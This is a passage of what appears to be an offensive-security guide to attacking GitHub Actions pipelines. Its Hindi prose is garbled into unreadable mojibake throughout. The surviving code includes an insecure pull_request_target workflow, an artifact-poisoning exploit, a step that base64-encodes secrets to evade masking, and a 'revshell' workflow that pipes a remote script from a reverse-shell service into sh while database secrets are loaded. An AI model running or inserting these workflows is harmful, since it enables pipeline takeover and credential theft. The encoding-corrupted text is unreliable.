рд╣рдордиреЗ рд╕рднреА рддрд░реАрдХреЛрдВ рдХрд╛ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рд╣реИ рдЬрд┐рдирд╕реЗ рдПрдХ рдмрд╛рд╣рд░реА рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдЧрд┐рдЯрд╣рдм рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЕрдм рдЖрдЗрдП рджреЗрдЦреЗрдВ рдХрд┐ рдпрджрд┐ рдпреЗ рдирд┐рд╖реНрдкрд╛рджрди, рдпрджрд┐ рдЧрд▓рдд рддрд░реАрдХреЗ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╣реИрдВ, рддреЛ рдХреИрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

### рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдЪреЗрдХрдЖрдЙрдЯ рдирд┐рд╖реНрдкрд╛рджрди

**`pull_request`** рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рд╡рд░реНрдХрдлрд╝реНрд▓реЛ **PR рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛ (рдЗрд╕рд▓рд┐рдП рдпрд╣ **рджреБрд╖реНрдЯ PRs рдХреЛрдб** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛), рд▓реЗрдХрд┐рди рдХрд┐рд╕реА рдХреЛ рдЗрд╕реЗ **рдкрд╣рд▓реЗ рдЕрдзрд┐рдХреГрдд** рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдпрд╣ рдХреБрдЫ [рд╕реАрдорд╛рдУрдВ](./#pull_request) рдХреЗ рд╕рд╛рде рдЪрд▓реЗрдЧрд╛ред

рдпрджрд┐ рдПрдХ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ **`pull_request_target` рдпрд╛ `workflow_run`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬреЛ рдПрдХ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдкрд░ рдирд┐рд░реНрднрд░ рд╣реИ рдЬрд┐рд╕реЗ **`pull_request_target` рдпрд╛ `pull_request`** рд╕реЗ рдкреНрд░реЗрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рдореВрд▓ рд░реЗрдкреЛ рдХрд╛ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛, рдЗрд╕рд▓рд┐рдП **рд╣рдорд▓рд╛рд╡рд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреЛрдб рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛**ред

{% hint style="danger" %}
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ **рдПрдХреНрд╢рди** рдореЗрдВ рдПрдХ **рд╕реНрдкрд╖реНрдЯ PR рдЪреЗрдХрдЖрдЙрдЯ** рд╣реИ рдЬреЛ **PR рд╕реЗ рдХреЛрдб рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛** (рдФрд░ рдЖрдзрд╛рд░ рд╕реЗ рдирд╣реАрдВ), рддреЛ рдпрд╣ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП (рд▓рд╛рдЗрди 12 рджреЗрдЦреЗрдВ рдЬрд╣рд╛рдВ PR рдХреЛрдб рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ **рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХреЛрдб `npm install` рдпрд╛ `npm build` рдХреЗ рджреМрд░рд╛рди рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ рдирд┐рд░реНрдорд╛рдг рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдФрд░ рд╕рдВрджрд░реНрднрд┐рдд **рдкреИрдХреЗрдЬ PR рдХреЗ рд▓реЗрдЦрдХ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реИрдВ**ред

{% hint style="warning" %}
рдХрдордЬреЛрд░ рдХрд╛рд░реНрдпреЛрдВ рдХреА рдЦреЛрдЬ рдХреЗ рд▓рд┐рдП рдПрдХ рдЧрд┐рдЯрд╣рдм рдбреЙрд░реНрдХ рд╣реИ: `event.pull_request pull_request_target extension:yml` рд╣рд╛рд▓рд╛рдБрдХрд┐, рднрд▓реЗ рд╣реА рдПрдХреНрд╢рди рдХреЛ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ, рдлрд┐рд░ рднреА рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рд╣реИрдВ (рдЬреИрд╕реЗ рдХрд┐ рдпрд╣ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ PR рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдЕрднрд┐рдиреЗрддрд╛ рдХреМрди рд╣реИ)ред
{% endhint %}

### рд╕рдВрджрд░реНрдн рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХреБрдЫ [**рдЧрд┐рдЯрд╣рдм рд╕рдВрджрд░реНрдн**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) рд╣реИрдВ рдЬрд┐рдирдХреЗ рдорд╛рди **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ PR рдмрдирд╛ рд░рд╣рд╛ рд╣реИред рдпрджрд┐ рдЧрд┐рдЯрд╣рдм рдПрдХреНрд╢рди рдЙрд╕ **рдбреЗрдЯрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреБрдЫ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд░рд╣рд╛ рд╣реИ**, рддреЛ рдпрд╣ **рдордирдорд╛рдиреЗ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди** рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB_ENV рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░: рдЖрдк рдХрд┐рд╕реА рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХрд╛рд░реНрдп рдореЗрдВ рдХрд┐рд╕реА рднреА рдмрд╛рдж рдХреЗ рдЪрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ **рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдЙрдкрд▓рдмреНрдз** рдХрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕реЗ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдпрд╛ рдЕрдкрдбреЗрдЯ рдХрд░рдХреЗ рдФрд░ рдЗрд╕реЗ **`GITHUB_ENV`** рдкрд░реНрдпрд╛рд╡рд░рдг рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрдХрд░ред

рдпрджрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ **env** рдЪрд░ рдХреЗ рдЕрдВрджрд░ **рдХреЛрдИ рднреА рдорд╛рди** **рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ env рдЪрд░ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЕрдЧрд▓реЗ рдЪрд░рдгреЛрдВ рдореЗрдВ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ **LD_PRELOAD** рдпрд╛ **NODE_OPTIONS**ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП ([**рдпрд╣**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) рдФрд░ [**рдпрд╣**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), рдХрд▓реНрдкрдирд╛ рдХрд░реЗрдВ рдХрд┐ рдПрдХ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдПрдХ рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдХрд▓рд╛рдХреГрддрд┐ рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░ рд░рд╣рд╛ рд╣реИ рддрд╛рдХрд┐ рдЗрд╕рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ **`GITHUB_ENV`** env рдЪрд░ рдХреЗ рдЕрдВрджрд░ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕реЗ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### рдХрдордЬреЛрд░ рддреГрддреАрдп рдкрдХреНрд╖ рдЧрд┐рдЯрд╣рдм рдПрдХреНрд╢рди

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

рдЬреИрд╕рд╛ рдХрд┐ [**рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks) рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрд╣ рдЧрд┐рдЯрд╣рдм рдПрдХреНрд╢рди рд╡рд┐рднрд┐рдиреНрди рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рд╕реЗ рдХрд▓рд╛рдХреГрддрд┐рдпреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдпрджрд┐ **`path`** рдкреИрд░рд╛рдореАрдЯрд░ рд╕реЗрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдХрд▓рд╛рдХреГрддрд┐ рд╡рд░реНрддрдорд╛рди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдирд┐рдХрд╛рд▓реА рдЬрд╛рддреА рд╣реИ рдФрд░ рдпрд╣ рдЙрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рд╕рдХрддреА рд╣реИ рдЬреЛ рдмрд╛рдж рдореЗрдВ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдХрд▓рд╛рдХреГрддрд┐ рдХрдордЬреЛрд░ рд╣реИ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреНрдп рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдХрд▓рд╛рдХреГрддрд┐ рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рддреЗ рд╣реИрдВред

рдХрдордЬреЛрд░ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
рдпрд╣ рдЗрд╕ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЗ рд╕рд╛рде рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## рдЕрдиреНрдп рдмрд╛рд╣рд░реА рдкрд╣реБрдБрдЪ

### рд╣рдЯрд╛рдП рдЧрдП Namespace Repo Hijacking

рдпрджрд┐ рдПрдХ рдЦрд╛рддрд╛ рдЕрдкрдирд╛ рдирд╛рдо рдмрджрд▓рддрд╛ рд╣реИ, рддреЛ рдХреБрдЫ рд╕рдордп рдмрд╛рдж рдХреЛрдИ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЙрд╕ рдирд╛рдо рдХреЗ рд╕рд╛рде рдПрдХ рдЦрд╛рддрд╛ рдкрдВрдЬреАрдХреГрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ рдПрдХ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХрд╛ **рдирд╛рдо рдмрджрд▓рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ 100 рд╕реЗ рдХрдо рд╕рд┐рддрд╛рд░реЗ рдереЗ**, рддреЛ Github рдирдП рдкрдВрдЬреАрдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЙрд╕реА рдирд╛рдо рдХреЗ рд╕рд╛рде рдПрдХ **рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдмрдирд╛рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ рдЬреЛ рд╣рдЯрд╛рдИ рдЧрдИ рдереАред

{% hint style="danger" %}
рддреЛ рдпрджрд┐ рдПрдХ рдХреНрд░рд┐рдпрд╛ рдПрдХ рдЧреИрд░-рдореМрдЬреВрдж рдЦрд╛рддреЗ рд╕реЗ рдПрдХ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реА рд╣реИ, рддреЛ рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрд╕ рдЦрд╛рддреЗ рдХреЛ рдмрдирд╛ рд╕рдХреЗ рдФрд░ рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░ рд╕рдХреЗред
{% endhint %}

рдпрджрд┐ рдЕрдиреНрдп рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА **рдЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рд╕реЗ рдирд┐рд░реНрднрд░рддрд╛рдПрдБ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реА рд╣реИрдВ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрдиреНрд╣реЗрдВ рд╣рд╛рдЗрдЬреИрдХ рдХрд░ рд╕рдХреЗрдЧрд╛ред рдпрд╣рд╛рдБ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдЕрдзрд┐рдХ рдкреВрд░реНрдг рд╡реНрдпрд╛рдЦреНрдпрд╛ рд╣реИ: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo Pivoting

{% hint style="info" %}
рдЗрд╕ рдЕрдиреБрднрд╛рдЧ рдореЗрдВ рд╣рдо рдЙрди рддрдХрдиреАрдХреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдмрд╛рдд рдХрд░реЗрдВрдЧреЗ рдЬреЛ **рдПрдХ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рд╕реЗ рджреВрд╕рд░реА рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдореЗрдВ рдкрд┐рд╡рдЯ** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВрдЧреА, рдорд╛рдирддреЗ рд╣реБрдП рдХрд┐ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╡рд╛рд▓реЗ рдкрд░ рдХреБрдЫ рдкреНрд░рдХрд╛рд░ рдХреА рдкрд╣реБрдБрдЪ рд╣реИ (рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧ рдХреЛ рджреЗрдЦреЗрдВ)ред
{% endhint %}

### рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ

рдПрдХ рдХреИрд╢ рдХреЛ **рд╕рдорд╛рди рд╢рд╛рдЦрд╛ рдореЗрдВ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рд░рди рдХреЗ рдмреАрдЪ рдмрдирд╛рдП рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдпрджрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рдПрдХ рдкреИрдХреЗрдЬ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рддрд╛ рд╣реИ** рдЬреЛ рдлрд┐рд░ рдХреИрд╢ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддрд╛ рд╣реИ рдФрд░ **рдбрд╛рдЙрдирд▓реЛрдб** рдФрд░ **рдЕрдзрд┐рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд** рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдЙрд╕ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ рднреА **рд╕рдордЭреМрддрд╛** рдХрд░ рд╕рдХреЗрдЧрд╛ред

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### рдЖрд░реНрдЯрд┐рдлреИрдХреНрдЯ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ

рд╡рд░реНрдХрдлрд╝реНрд▓реЛ **рдЕрдиреНрдп рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рд╕реЗ рдЖрд░реНрдЯрд┐рдлреИрдХреНрдЯреНрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрджрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрд╕ Github Action рдХреЛ **рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ** рдЬреЛ рдПрдХ рдЖрд░реНрдЯрд┐рдлреИрдХреНрдЯ **рдЕрдкрд▓реЛрдб рдХрд░рддрд╛ рд╣реИ** рдЬреЛ рдмрд╛рдж рдореЗрдВ рдХрд┐рд╕реА рдЕрдиреНрдп рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ **рдЕрдиреНрдп рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ рднреА рд╕рдордЭреМрддрд╛** рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## рдПрдХ рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдкреЛрд╕реНрдЯ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди

### OIDC рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ AWS рдФрд░ GCP рддрдХ рдкрд╣реБрдБрдЪ

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрдареЛрдВ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### рд░рд╣рд╕реНрдпреЛрдВ рддрдХ рдкрд╣реБрдБрдЪ <a href="#accessing-secrets" id="accessing-secrets"></a>

рдпрджрд┐ рдЖрдк рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рд╕рд╛рдордЧреНрд░реА рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдЬрд╛рдирдирд╛ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдХрд┐ рдЖрдк рд░рд╣рд╕реНрдпреЛрдВ рддрдХ рдХреИрд╕реЗ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ:

* рдпрджрд┐ рд░рд╣рд╕реНрдп рдпрд╛ рдЯреЛрдХрди рдХреЛ **рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░** рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ **`printenv`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реАрдзреЗ рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

<details>

<summary>Github Action рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рд░рд╣рд╕реНрдпреЛрдВ рдХреА рд╕реВрдЪреА</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>рдЧреБрдкреНрддреЛрдВ рдХреЗ рд╕рд╛рде рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* рдпрджрд┐ рдЧреБрдкреНрдд рдХреЛ **рдПрдХреНрд╕рдкреНрд░реЗрд╢рди рдореЗрдВ рд╕реАрдзреЗ** рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЙрддреНрдкрдиреНрди рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ **рдСрди-рдбрд┐рд╕реНрдХ** рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИ рдФрд░ рд╕реБрд▓рдн рд╣реЛрддреА рд╣реИред
* ```bash
cat /home/runner/work/_temp/*
```
* рдПрдХ JavaScript рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЧреБрдкреНрдд рдФрд░ рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ
* ```bash
ps axe | grep node
```
*   рдПрдХ **рдХрд╕реНрдЯрдо рдХреНрд░рд┐рдпрд╛** рдХреЗ рд▓рд┐рдП, рдЬреЛрдЦрд┐рдо рдЗрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдПрдХ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдиреЗ **рдЖрд░реНрдЧреБрдореЗрдВрдЯ** рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдЧреБрдкреНрдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рд╣реИ:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### рд╕реНрд╡рдпрдВ-рд╣реЛрд╕реНрдЯреЗрдб рд░рдирд░реНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

